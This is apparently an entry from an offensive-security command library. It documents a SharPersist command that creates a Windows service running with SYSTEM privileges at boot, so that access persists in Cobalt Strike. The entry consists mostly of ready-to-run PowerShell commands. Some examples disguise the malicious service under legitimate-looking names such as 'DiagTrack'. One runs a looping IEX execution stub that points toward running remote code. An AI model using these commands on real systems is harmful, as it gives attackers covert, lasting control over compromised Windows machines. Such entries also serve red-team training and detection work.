---
type: command
executor: powershell
data: >-
  SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n
  "Some Service" -m add
tags:
  - persistence
  - creation
platforms:
  - Windows
verified: true
validated: true
---

# sharpersist-add-service-persistence

## Command

```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

## Description

Creates a new Windows service for boot-time execution with SYSTEM privileges, ensuring persistent access in Cobalt Strike.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-t service` | Type: Windows service | Yes |
| `-c <command>` | Executable path for the service binary | Yes |
| `-a <args>` | Arguments for the service start | Yes |
| `-n <name>` | Service display name | Yes |
| `-m add` | Mode to add the service | Yes |

## Examples

### Basic Usage

```powershell
SharPersist -t service -c "C:\Windows\System32\svchost.exe" -a "-k netsvcs -p" -n "NetworkServiceHelper" -m add
```

### Advanced Usage

```powershell
SharPersist -t service -c "powershell.exe" -a "-c while($true){Start-Sleep 60; IEX ...}" -n "DiagTrack" -m add
```

## Expected Output

```
Service added: Some Service
Starting service...
```

Verify with 'sc query Some Service'.

## Related

- [[procedures/Establish-Persistence-Using-SharPersist-in-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
